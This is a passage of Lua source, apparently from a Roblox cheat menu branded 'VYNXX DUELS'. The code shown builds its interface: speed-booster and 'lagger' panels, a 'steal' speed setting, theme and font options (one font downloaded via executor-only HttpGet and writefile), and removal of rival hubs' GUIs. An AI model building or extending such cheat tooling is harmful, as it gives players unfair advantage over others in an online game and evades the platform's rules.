            opacity = imageTransparency
            M.customBgOpacity = opacity
            fill.Size = UDim2.new(rel, 0, 1, 0)
            knob.Position = UDim2.new(rel, 0, 0.5, 0)
            preview.ImageTransparency = opacity
            opVal.Text = tostring(math.floor(rel * 100)) .. "%"
            if M.mainFrame then M.applyCustomBackground(M.mainFrame) end
            
            if M.statusMain then
                local bg = M.statusMain:FindFirstChild("CustomBgImage")
                if bg then pcall(function() bg:Destroy() end) end
            end
            if M.antiDesyncMain then M.applyCustomBackground(M.antiDesyncMain) end
            if M.applyPingBackgrounds then M.applyPingBackgrounds() end
            pcall(function() M.applyAntiDesyncTheme() end)
            saveCherryConfig()
        end
        track.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                setFromX(i.Position.X)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                setFromX(i.Position.X)
            end
        end)
        UIS.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
    end
end





function M._fontShouldTouch(obj)
    if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return false end
    if obj.TextStrokeTransparency ~= 1 then return false end
    return true
end

function M._fontApplyOne(txt)
    if not M._fontShouldTouch(txt) then return end
    if not M._fontOrig[txt] then M._fontOrig[txt] = txt.FontFace end
    if M._fontMy then
        pcall(function() txt.FontFace = M._fontMy end)
    end
end

function M._fontSetupCoding()
    if M._fontMy and M.customFontSelected == "Coding Font" then return true end
    local ok = pcall(function()
        if isfile and writefile and getcustomasset then
            if not isfile("vynx_starborn.ttf") then
                writefile("vynx_starborn.ttf", game:HttpGet("https://granny.anondrop.net/uploads/6c2505542959f371/Starborn.ttf"))
            end
            writefile("vynx_starborn.json", HS:JSONEncode({
                name = "Starborn",
                faces = {{name = "Regular", weight = 400, style = "normal", assetId = getcustomasset("vynx_starborn.ttf")}}
            }))
            M._fontMy = Font.new(getcustomasset("vynx_starborn.json"))
        end
    end)
    return ok and M._fontMy ~= nil
end

function M.getFontForName(name)
    if not name or name == "None" then return nil end
    if name == "Coding Font" then
        if M._fontSetupCoding() then return M._fontMy end
        return nil
    elseif name == "Summer" then
        return Font.new("rbxasset://fonts/families/PermanentMarker.json")
    elseif name == "Beachy" then
        return Font.new("rbxasset://fonts/families/DenkOne.json")
    elseif name == "Scary" then
        return Font.new("rbxasset://fonts/families/Creepster.json")
    elseif name == "Bangers" then
        return Font.new("rbxasset://fonts/families/Bangers.json")
    end
    return nil
end

function M.applyCustomFont(name)
    if M._fontConn then pcall(function() M._fontConn:Disconnect() end); M._fontConn = nil end
    for obj, orig in pairs(M._fontOrig) do
        pcall(function() if obj and obj.Parent then obj.FontFace = orig end end)
    end
    M._fontOrig = {}
    M.customFontSelected = name or "None"
    if name and name ~= "None" then
        local font = M.getFontForName(name)
        if font then
            M._fontMy = font
            for _, v in ipairs(game:GetDescendants()) do
                M._fontApplyOne(v)
            end
            M._fontConn = game.DescendantAdded:Connect(function(obj)
                if M.customFontSelected ~= "None" then M._fontApplyOne(obj) end
            end)
        end
    else
        M._fontMy = nil
    end
    
    pcall(function()
        if type(saveCherryConfig) == "function" then saveCherryConfig() end
    end)
end


function M.resetSpeedBoosterPosition()
    M.speedBoosterPos = nil
    if M.speedBoosterMain then
        M.speedBoosterMain.Position = UDim2.new(0, 20, 0.35, 0)
    end
    pcall(saveCherryConfig)
end

function M.buildSpeedBoosterUI()
    if M.speedBoosterGui then
        pcall(function() M.speedBoosterGui:Destroy() end)
        M.speedBoosterGui = nil
        M.speedBoosterMain = nil
    end
    
    local ACCENT = (M.Theme and M.Theme.Accent) or M.UI_ACCENT or UI_ACCENT or Color3.fromRGB(0, 255, 170)
    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxSpeedBooster"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 45
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function()
        if gethui then gui.Parent = gethui() else gui.Parent = game:GetService("CoreGui") end
    end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end
    M.speedBoosterGui = gui

    
    local main = Instance.new("Frame")
    main.Name = "Main"
    main.Size = UDim2.new(0, 168, 0, 168)
    if type(M.speedBoosterPos) == "table" then
        local p = M.speedBoosterPos
        main.Position = UDim2.new(p[1] or 0, p[2] or 20, p[3] or 0.35, p[4] or 0)
    else
        main.Position = UDim2.new(0, 20, 0.35, 0)
    end
    main.BackgroundColor3 = Color3.fromRGB(12, 14, 18)
    main.BackgroundTransparency = 0.04
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Visible = (M.speedUIMode or "Original") ~= "Original" and (M.speedBoosterPanelOpen ~= false)
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
    local st = Instance.new("UIStroke"); st.Color = ACCENT; st.Thickness = 1.2; st.Transparency = 0.4; st.Parent = main
    M.speedBoosterMain = main

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 26)
    header.BackgroundTransparency = 1
    header.Active = true
    header.Parent = main

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -28, 1, 0)
    title.Position = UDim2.new(0, 8, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "Speed"
    title.TextColor3 = ACCENT
    title.Font = Enum.Font.GothamBold
    title.TextSize = 11
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = header

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 20, 0, 20)
    closeBtn.Position = UDim2.new(1, -24, 0.5, -10)
    closeBtn.BackgroundColor3 = Color3.fromRGB(22, 24, 30)
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "x"
    closeBtn.TextColor3 = ACCENT
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 11
    closeBtn.AutoButtonColor = false
    closeBtn.Parent = header
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 5)

    do
        local dragging, dragStart, startPos
        header.InputBegan:Connect(function(input)
            if M.uiLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = main.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                        M.speedBoosterPos = {main.Position.X.Scale, main.Position.X.Offset, main.Position.Y.Scale, main.Position.Y.Offset}
                        pcall(saveCherryConfig)
                    end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if not dragging or M.uiLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local d = input.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end
    closeBtn.MouseButton1Click:Connect(function()
        M.speedBoosterPanelOpen = false
        main.Visible = false
        pcall(saveCherryConfig)
    end)

    local body = Instance.new("Frame")
    body.Size = UDim2.new(1, -12, 1, -32)
    body.Position = UDim2.new(0, 6, 0, 28)
    body.BackgroundTransparency = 1
    body.Parent = main

    local path = (M.speedBoosterPath == "Lagger") and "Lagger" or "Normal"
    if M.laggerModeEnabled or M.laggerCarryActive then
        path = "Lagger"
        M.speedBoosterPath = "Lagger"
    end

    local seg = Instance.new("Frame")
    seg.Size = UDim2.new(1, 0, 0, 24)
    seg.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
    seg.BorderSizePixel = 0
    seg.Parent = body
    Instance.new("UICorner", seg).CornerRadius = UDim.new(0, 7)

    local normalBtn = Instance.new("TextButton")
    normalBtn.Size = UDim2.new(0.5, -3, 1, -4)
    normalBtn.Position = UDim2.new(0, 2, 0, 2)
    normalBtn.BorderSizePixel = 0
    normalBtn.Text = "NORMAL"
    normalBtn.Font = Enum.Font.GothamBold
    normalBtn.TextSize = 9
    normalBtn.AutoButtonColor = false
    normalBtn.Parent = seg
    Instance.new("UICorner", normalBtn).CornerRadius = UDim.new(0, 6)

    local laggerBtn = Instance.new("TextButton")
    laggerBtn.Size = UDim2.new(0.5, -3, 1, -4)
    laggerBtn.Position = UDim2.new(0.5, 1, 0, 2)
    laggerBtn.BorderSizePixel = 0
    laggerBtn.Text = "LAGGER"
    laggerBtn.Font = Enum.Font.GothamBold
    laggerBtn.TextSize = 9
    laggerBtn.AutoButtonColor = false
    laggerBtn.Parent = seg
    Instance.new("UICorner", laggerBtn).CornerRadius = UDim.new(0, 6)

    local function paintSeg()
        if path == "Normal" then
            normalBtn.BackgroundColor3 = ACCENT; normalBtn.TextColor3 = Color3.fromRGB(10,12,14)
            laggerBtn.BackgroundColor3 = Color3.fromRGB(22,24,30); laggerBtn.TextColor3 = ACCENT
        else
            laggerBtn.BackgroundColor3 = ACCENT; laggerBtn.TextColor3 = Color3.fromRGB(10,12,14)
            normalBtn.BackgroundColor3 = Color3.fromRGB(22,24,30); normalBtn.TextColor3 = ACCENT
        end
    end
    paintSeg()

    local function makeValueRow(y, labelText)
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, 0, 0, 26)
        row.Position = UDim2.new(0, 0, 0, y)
        row.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
        row.BorderSizePixel = 0
        row.Parent = body
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 7)
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(0.48, 0, 1, 0)
        lbl.Position = UDim2.new(0, 8, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = labelText
        lbl.TextColor3 = ACCENT
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 10
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.Parent = row
        return row
    end

    local statusRow = makeValueRow(30, "Status")
    local statusBtn = Instance.new("TextButton")
    statusBtn.Size = UDim2.new(0, 44, 0, 18)
    statusBtn.Position = UDim2.new(1, -50, 0.5, -9)
    statusBtn.BorderSizePixel = 0
    statusBtn.Font = Enum.Font.GothamBold
    statusBtn.TextSize = 9
    statusBtn.AutoButtonColor = false
    statusBtn.Parent = statusRow
    Instance.new("UICorner", statusBtn).CornerRadius = UDim.new(0, 6)

    local function paintStatus()
        local on = M.speedBoosterEnabled ~= false
        statusBtn.Text = on and "ON" or "OFF"
        if on then statusBtn.BackgroundColor3 = ACCENT; statusBtn.TextColor3 = Color3.fromRGB(10,12,14)
        else statusBtn.BackgroundColor3 = Color3.fromRGB(30,32,38); statusBtn.TextColor3 = Color3.fromRGB(160,160,170) end
    end
    paintStatus()
    statusBtn.MouseButton1Click:Connect(function()
        M.speedBoosterEnabled = not (M.speedBoosterEnabled ~= false)
        paintStatus()
        if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
        pcall(saveCherryConfig)
    end)

    local speedRow = makeValueRow(60, "Speed")
    local speedBox = Instance.new("TextBox")
    speedBox.Size = UDim2.new(0, 48, 0, 18)
    speedBox.Position = UDim2.new(1, -54, 0.5, -9)
    speedBox.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
    speedBox.BorderSizePixel = 0
    speedBox.TextColor3 = ACCENT
    speedBox.Font = Enum.Font.GothamBold
    speedBox.TextSize = 10
    speedBox.ClearTextOnFocus = false
    speedBox.Parent = speedRow
    Instance.new("UICorner", speedBox).CornerRadius = UDim.new(0, 6)

    local stealRow = makeValueRow(90, "Steal")
    local stealBox = Instance.new("TextBox")
    stealBox.Size = UDim2.new(0, 48, 0, 18)
    stealBox.Position = UDim2.new(1, -54, 0.5, -9)
    stealBox.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
    stealBox.BorderSizePixel = 0
    stealBox.TextColor3 = ACCENT
    stealBox.Font = Enum.Font.GothamBold
    stealBox.TextSize = 10
    stealBox.ClearTextOnFocus = false
    stealBox.Parent = stealRow
    Instance.new("UICorner", stealBox).CornerRadius = UDim.new(0, 6)

    local function refreshBoxes()
        if path == "Lagger" then
            speedBox.Text = tostring(M.LAGGER_SPEED)
            stealBox.Text = tostring(M.LAGGER_CARRY_SPEED)
        else
            speedBox.Text = tostring(M.NS)
            stealBox.Text = tostring(M.CS)
        end
    end
    refreshBoxes()

    local function applyPath(forcePath, fromSync)
        if forcePath == "Lagger" or forcePath == "Normal" then path = forcePath end
        M.speedBoosterPath = path
        
        if not fromSync then
            M.speedBoosterEnabled = true
            if paintStatus then paintStatus() end
        elseif M.speedBoosterEnabled == nil then
            M.speedBoosterEnabled = true
        end
        if path == "Lagger" then
            M.laggerModeEnabled = true
            
        else
            M.laggerModeEnabled = false
        end
        if M.laggerModeBtn then M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
        if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
        if M.mobBtnRefs.lagger then pcall(function() M.mobBtnRefs.lagger(M.laggerModeEnabled) end) end
        if M.mobBtnRefs.laggerCarry then pcall(function() M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end) end
        if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end) end
        if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
        refreshBoxes(); paintSeg()
        if not fromSync then pcall(saveCherryConfig) end
    end

    
    M.speedBoosterSyncPath = function(newPath)
        if newPath ~= "Lagger" and newPath ~= "Normal" then return end
        path = newPath
        M.speedBoosterPath = path
        paintSeg()
        refreshBoxes()
    end

    normalBtn.MouseButton1Click:Connect(function() applyPath("Normal") end)
    laggerBtn.MouseButton1Click:Connect(function() applyPath("Lagger") end)
    speedBox.FocusLost:Connect(function()
        local n = tonumber(speedBox.Text)
        if n and n >= 1 and n <= 500 then
            if path == "Lagger" then M.LAGGER_SPEED = n else M.NS = n end
            speedBox.Text = tostring(n); pcall(saveCherryConfig)
        else refreshBoxes() end
    end)
    stealBox.FocusLost:Connect(function()
        local n = tonumber(stealBox.Text)
        if n and n >= 1 and n <= 500 then
            if path == "Lagger" then M.LAGGER_CARRY_SPEED = n else M.CS = n end
            stealBox.Text = tostring(n); pcall(saveCherryConfig)
        else refreshBoxes() end
    end)

    local resetBtn = Instance.new("TextButton")
    resetBtn.Size = UDim2.new(1, 0, 0, 22)
    resetBtn.Position = UDim2.new(0, 0, 0, 120)
    resetBtn.BackgroundColor3 = Color3.fromRGB(22, 24, 30)
    resetBtn.BorderSizePixel = 0
    resetBtn.Text = "RESET POS"
    resetBtn.TextColor3 = ACCENT
    resetBtn.Font = Enum.Font.GothamBold
    resetBtn.TextSize = 9
    resetBtn.AutoButtonColor = false
    resetBtn.Parent = body
    Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 6)
    resetBtn.MouseButton1Click:Connect(function() M.resetSpeedBoosterPosition() end)

    M.normalBox = speedBox; M.carryBox = stealBox; M.laggerBox = speedBox
    M.speedBoosterRefresh = refreshBoxes
    M.speedBoosterPaintStatus = paintStatus
    M.speedBoosterApplyPath = applyPath
    applyPath(path, true)
end

function M.setSpeedBoosterPanelOpen(on)
    M.speedBoosterPanelOpen = on and true or false
    if not M.speedBoosterMain then pcall(M.buildSpeedBoosterUI) end
    if M.speedBoosterMain then
        local show = M.speedBoosterPanelOpen and (M.speedUIMode or "Original") ~= "Original"
        M.speedBoosterMain.Visible = show
    end
    pcall(saveCherryConfig)
end

function M.buildGui()
    applyAccentFromTheme()
    M.clearPersistentConns()

    for _,n in ipairs({"MoveeDuels","Cherry_Menu","K7HubGUI","VantaHubUI","VynxxHubUI","VynxHubUI","AceDuelsAdaptReconstruct"}) do
        local cg=game:GetService("CoreGui")
        local old=cg:FindFirstChild(n); if old then old:Destroy() end
        local pg=player:FindFirstChild("PlayerGui")
        if pg then local o=pg:FindFirstChild(n); if o then o:Destroy() end end
    end

    M.buildStatusUI()

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxHubUI"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = player:WaitForChild("PlayerGui")

    local Frame = Instance.new("Frame")
    Frame.Name = "Frame"
    Frame.ClipsDescendants = true
    Frame.Position = UDim2.new(0, 28, 0.38, -120)
    Frame.Size = UDim2.new(0, 560, 0, 540)
    if type(M.menuPos) == "table" then
        local p = M.menuPos
        local xs = tonumber(p[1]) or tonumber(p.xScale)
        local xo = tonumber(p[2]) or tonumber(p.xOff)
        local ys = tonumber(p[3]) or tonumber(p.yScale)
        local yo = tonumber(p[4]) or tonumber(p.yOff)
        if xs and xo and ys and yo then
            Frame.Position = UDim2.new(xs, xo, ys, yo)
        end
    end
    Frame.BackgroundColor3 = UI_BG_DARK or Color3.fromRGB(16, 16, 20)
    Frame.BorderSizePixel = 0
    Frame.Active = true
    Frame.Parent = gui
    M.mainFrame = Frame

    local UIScale = Instance.new("UIScale")
    UIScale.Name = "BDUIScale"
    UIScale.Scale = M.uiScale or 0.8
    UIScale.Parent = Frame
    M.uiScaleRef = UIScale

    local frameCorner = Instance.new("UICorner")
    frameCorner.Name = "MainCorner"
    frameCorner.CornerRadius = UDim.new(0, M.MENU_CORNER_R or 16)
    frameCorner.Parent = Frame

    M.applyCustomBackground(Frame)
    do
        local g = Instance.new("UIGradient")
        g.Name = "MainGradient"
        local accent = UI_ACCENT or Color3.fromRGB(255,255,255)
        local bg = UI_BG_DARK or Color3.fromRGB(0,0,0)
        g.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, bg:Lerp(accent, 0.12)),
            ColorSequenceKeypoint.new(0.45, bg),
            ColorSequenceKeypoint.new(1, bg:Lerp(accent, 0.06)),
        })
        g.Rotation = 120
        g.Parent = Frame
        local stroke = Instance.new("UIStroke")
        stroke.Name = "MainStroke"
        stroke.Color = accent
        stroke.Thickness = 1.4
        stroke.Transparency = 0.55
        stroke.Parent = Frame
    end

    
    local Header = Instance.new("Frame")
    Header.Size = UDim2.new(1,0,0,56)
    Header.BackgroundTransparency = 1
    Header.Active = true
    Header.Parent = Frame

    do
        local t = Instance.new("TextLabel"); t.ZIndex=3
        local strokeCol = (UI_ACCENT or Color3.fromRGB(255, 255, 255))
        
        do
            local tn = (M.Theme and M.Theme.Name) or (CherryConfig and CherryConfig.Theme) or M.colorScheme or "White"
            if tn == "White" or tn == "Default" then
                strokeCol = Color3.fromRGB(255, 255, 255)
            end
        end
        t.Position = UDim2.new(0,16,0,6); t.Size = UDim2.new(0,280,0,26)
        t.BackgroundTransparency = 1
        t.Text = "VYNXX"
        t.TextColor3 = Color3.fromRGB(0, 0, 0)
        t.TextSize = 20; t.Font = Enum.Font.GothamBlack
        t.TextXAlignment = Enum.TextXAlignment.Left
        t.TextStrokeColor3 = strokeCol
        t.TextStrokeTransparency = 0
        t.Parent = Header
        M.titleLabel = t

        local s = Instance.new("TextLabel"); s.ZIndex=3
        s.Name = "MadeByTag"
        s.Position = UDim2.new(0,16,0,32); s.Size = UDim2.new(0,200,0,14)
        s.BackgroundTransparency = 1
        s.Text = "VYNXX DUELS"
        s.TextColor3 = Color3.fromRGB(0, 0, 0)
        s.TextSize = 11; s.Font = Enum.Font.GothamBold
        s.TextXAlignment = Enum.TextXAlignment.Left
        s.TextStrokeColor3 = strokeCol
        s.TextStrokeTransparency = 0
        s.Parent = Header
        M.madeByTag = s

        
        local dtag = Instance.new("TextLabel")
        dtag.Name = "DiscordHeaderTag"
        dtag.ZIndex = 3
        dtag.AnchorPoint = Vector2.new(0.5, 0.5)
        dtag.Position = UDim2.new(0.5, 0, 0.5, 0)
        dtag.Size = UDim2.new(0, 220, 0, 18)
        dtag.BackgroundTransparency = 1
        dtag.Text = "DISCORD.GG/VYNXDUELS"
        dtag.TextColor3 = Color3.fromRGB(0, 0, 0)
        dtag.TextSize = 11
        dtag.Font = Enum.Font.GothamBlack
        dtag.TextXAlignment = Enum.TextXAlignment.Center
        dtag.TextStrokeColor3 = strokeCol
        dtag.TextStrokeTransparency = 0
        dtag.Parent = Header
        M.discordHeaderTag = dtag
    end

    local MinBtn = Instance.new("TextButton")
    MinBtn.ZIndex=5; MinBtn.Position=UDim2.new(1,-46,0,6); MinBtn.Size=UDim2.new(0,36,0,36)
    MinBtn.BackgroundColor3=UI_BTN_BG; MinBtn.BorderSizePixel=0; MinBtn.Text="-"
    MinBtn.TextColor3=UI_TEXT_PRIMARY; MinBtn.TextSize=22; MinBtn.Font=Enum.Font.GothamBold
    MinBtn.AutoButtonColor=false; MinBtn.Parent=Header
    Instance.new("UICorner",MinBtn).CornerRadius = UDim.new(1, 0) 
    MinBtn.MouseButton1Down:Connect(function() TweenService:Create(MinBtn, UI_TWEEN_FAST, {BackgroundColor3 = UI_ACCENT}):Play() end)
    MinBtn.MouseButton1Up:Connect(function() TweenService:Create(MinBtn, UI_TWEEN_FAST, {BackgroundColor3 = UI_BTN_BG}):Play() end)

    
    local function resolveCombatThemeName(name)
        name = tostring(name or "")
        if name == "Default" then return "Red" end
        if name == "Forest" then return "Green" end
        local list = M.COMBAT_COLOR_THEMES or {"White", "Purple", "Red", "Green"}
        for _, n in ipairs(list) do
            if n == name then return name end
        end
        return "Red"
    end

    local function applyCombatTheme(name, rebuild)
        name = resolveCombatThemeName(name)
        if not CHERRY_THEMES[name] then return end
        CherryConfig.Theme = name
        M.colorScheme = name
        M._savedTheme = name
        pcall(applyAccentFromTheme)
        pcall(saveCherryConfig)
        if rebuild ~= false then
            task.defer(function()
                pcall(function()
                    if M.buildGui then M.buildGui() end
                end)
                pcall(function()
                    if M.buildStatusUI then M.buildStatusUI() end
                    if M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT or M.UI_ACCENT) end
                    if M.updateHeadTheme then M.updateHeadTheme() end
                    pcall(function()
                        local ch = player.Character
                        if ch and M.setupHeadIndicator then
                            if not (M.headIndicator and M.headIndicator.bb and M.headIndicator.bb.Parent) then
                                M.setupHeadIndicator(ch)
                            else
                                M.updateHeadTheme()
                            end
                        end
                    end)
                    if M.mobileButtonsEnabled and M.buildMobileButtons then
                        pcall(M.buildMobileButtons)
                    end
                    if M.buildPingLaggerUI and M.pingPanelOpen then
                        M.buildPingLaggerUI()
                        M.setPingPanelOpen(true)
                    end
                    if M.buildVynxLaggerUI and M.vynxLaggerPanelOpen then
                        M.buildVynxLaggerUI()
                        M.setVynxLaggerPanelOpen(true)
                    end
                    if M.mobileButtonsEnabled and M.buildMobileButtons then
                        M.buildMobileButtons()
                    end
                    
                    if M.recolorAllVynxGuis then M.recolorAllVynxGuis() end
                    if M.mainFrame and M.recolorBlacksToTheme then
                        M.recolorBlacksToTheme(M.mainFrame)
                    end
                    
                    if (M.speedUIMode or "Original") == "Customizer" then
                        M.speedBoosterEnabled = true
                        pcall(function()
                            if M.buildSpeedBoosterUI then M.buildSpeedBoosterUI() end
                            if M.speedBoosterMain then
                                M.speedBoosterMain.Visible = (M.speedBoosterPanelOpen ~= false)
                            end
                        end)
                    end
                    if M.mobileButtonsEnabled and M.buildMobileButtons then
                        pcall(M.buildMobileButtons)
                    end
                end)
            end)
        else
            pcall(function()
                if M.recolorAllVynxGuis then M.recolorAllVynxGuis() end
            end)
        end
    end
    M.applyCombatTheme = applyCombatTheme

    local themeList = M.COMBAT_COLOR_THEMES or {"White", "Purple", "Red", "Green"}
    local curTheme = resolveCombatThemeName(CherryConfig.Theme or M.colorScheme or M._savedTheme or "Purple")
    local themeAccent = (CHERRY_THEMES[curTheme] and CHERRY_THEMES[curTheme].Accent)
        or UI_ACCENT
        or Color3.fromRGB(165, 75, 255)

    
    local lockButton = Instance.new("TextButton")
    lockButton.Name = "LockBtn"
    lockButton.Size = UDim2.new(0, 72, 0, 22)
    lockButton.Position = UDim2.new(1, -126, 0, 4)
    lockButton.BackgroundColor3 = UI_BTN_BG
    lockButton.BorderSizePixel = 0
    lockButton.Text = (M.uiLocked and "LOCKED") or "UNLOCK"
    lockButton.TextColor3 = M.uiLocked and (UI_ACCENT or Color3.fromRGB(255,255,255)) or (UI_TEXT_DIM or Color3.fromRGB(160,160,170))
    lockButton.Font = Enum.Font.GothamBold
    lockButton.TextSize = 10
    lockButton.AutoButtonColor = false
    lockButton.ZIndex = 6
    lockButton.Parent = Header
    Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0, 6)

    lockButton.Activated:Connect(function()
        M.uiLocked = not M.uiLocked
        lockButton.Text = M.uiLocked and "LOCKED" or "UNLOCK"
        lockButton.TextColor3 = M.uiLocked and (UI_ACCENT or Color3.fromRGB(255,255,255)) or (UI_TEXT_DIM or Color3.fromRGB(160,160,170))
        pcall(saveCherryConfig)
    end)
    M.lockButtonRef = lockButton

    local colorBtn = Instance.new("TextButton")
    colorBtn.Name = "ColorThemeBtn"
    colorBtn.Size = UDim2.new(0, 72, 0, 20)
    colorBtn.Position = UDim2.new(1, -126, 0, 28)
    colorBtn.BackgroundColor3 = themeAccent
    colorBtn.BorderSizePixel = 0
    colorBtn.Text = string.upper(string.sub(curTheme, 1, 1)) .. string.lower(string.sub(curTheme, 2))
    colorBtn.TextColor3 = (curTheme == "White") and Color3.fromRGB(20, 20, 24) or Color3.fromRGB(255, 255, 255)
    colorBtn.Font = Enum.Font.GothamBold
    colorBtn.TextSize = 9
    colorBtn.AutoButtonColor = false
    colorBtn.ZIndex = 6
    colorBtn.Parent = Header
    Instance.new("UICorner", colorBtn).CornerRadius = UDim.new(0, 6)
    local colorStroke = Instance.new("UIStroke", colorBtn)
    colorStroke.Thickness = 1.2
    colorStroke.Color = Color3.fromRGB(255, 255, 255)
    colorStroke.Transparency = 0.55

    colorBtn.Activated:Connect(function()
        local list = M.COMBAT_COLOR_THEMES or {"White", "Purple", "Red", "Green"}
        local cur = resolveCombatThemeName(CherryConfig.Theme or M.colorScheme or M._savedTheme or "Purple")
        local idx = 1
        for i, n in ipairs(list) do
            if n == cur then idx = i break end
        end
        local nextName = list[(idx % #list) + 1]
        applyCombatTheme(nextName, true)
    end)
    M.colorThemeBtn = colorBtn

    
    local SideBar = Instance.new("Frame")
    SideBar.Name = "SideBar"
    SideBar.Position = UDim2.new(0, 10, 0, 56)
    SideBar.Size = UDim2.new(0, 100, 1, -68)
    SideBar.BackgroundColor3 = UI_SIDEBAR_BG or Color3.fromRGB(10, 10, 14)
    SideBar.BackgroundTransparency = 0.25
    SideBar.BorderSizePixel = 0
    SideBar.Parent = Frame
    Instance.new("UICorner", SideBar).CornerRadius = UDim.new(0, 12)
    do
        local ss = Instance.new("UIStroke")
        ss.Color = Color3.fromRGB(36, 36, 44)
        ss.Transparency = 0.55
        ss.Thickness = 1
        ss.Parent = SideBar
    end

    local TabBar = Instance.new("ScrollingFrame")
    TabBar.Name = "TabBar"
    TabBar.Position = UDim2.new(0, 4, 0, 8)
    TabBar.Size = UDim2.new(1, -8, 1, -16)
    TabBar.BackgroundTransparency = 1
    TabBar.BorderSizePixel = 0
    TabBar.ScrollBarThickness = 0
    TabBar.ScrollingDirection = Enum.ScrollingDirection.Y
    TabBar.ElasticBehavior = Enum.ElasticBehavior.Never
    TabBar.CanvasSize = UDim2.new(0, 0, 0, 0)
    TabBar.AutomaticCanvasSize = Enum.AutomaticSize.Y
    TabBar.Parent = SideBar

    local TabsLayout = Instance.new("UIListLayout")
    TabsLayout.FillDirection = Enum.FillDirection.Vertical
    TabsLayout.Padding = UDim.new(0, 28)
    TabsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    TabsLayout.SortOrder = Enum.SortOrder.LayoutOrder
    TabsLayout.Parent = TabBar
    local TabPad = Instance.new("UIPadding")
    TabPad.PaddingTop = UDim.new(0, 16)
    TabPad.PaddingBottom = UDim.new(0, 16)
    TabPad.Parent = TabBar

    local TSpeed = uiMakeTab(TabBar,"Tab_SPEED","Speed",nil,true); TSpeed.LayoutOrder=1
    local TMech  = uiMakeTab(TabBar,"Tab_MECH","Combat",nil,false); TMech.LayoutOrder=2
    local TVis   = uiMakeTab(TabBar,"Tab_VIS","Visuals",nil,false); TVis.LayoutOrder=3

    
    local SideBarR = Instance.new("Frame")
    SideBarR.Name = "SideBarRight"
    SideBarR.Position = UDim2.new(1, -110, 0, 56)
    SideBarR.Size = UDim2.new(0, 100, 1, -68)
    SideBarR.BackgroundColor3 = UI_SIDEBAR_BG or Color3.fromRGB(10, 10, 14)
    SideBarR.BackgroundTransparency = 0.25
    SideBarR.BorderSizePixel = 0
    SideBarR.Parent = Frame
    Instance.new("UICorner", SideBarR).CornerRadius = UDim.new(0, 12)
    do
        local ss = Instance.new("UIStroke")
        ss.Color = Color3.fromRGB(36, 36, 44)
        ss.Transparency = 0.55
        ss.Thickness = 1
        ss.Parent = SideBarR
    end

    local TabBarR = Instance.new("ScrollingFrame")
    TabBarR.Name = "TabBarRight"
    TabBarR.Position = UDim2.new(0, 4, 0, 8)
    TabBarR.Size = UDim2.new(1, -8, 1, -16)
    TabBarR.BackgroundTransparency = 1
    TabBarR.BorderSizePixel = 0
    TabBarR.ScrollBarThickness = 0
    TabBarR.ScrollingDirection = Enum.ScrollingDirection.Y
    TabBarR.ElasticBehavior = Enum.ElasticBehavior.Never
    TabBarR.CanvasSize = UDim2.new(0, 0, 0, 0)
    TabBarR.AutomaticCanvasSize = Enum.AutomaticSize.Y
    TabBarR.Parent = SideBarR

    local TabsLayoutR = Instance.new("UIListLayout")
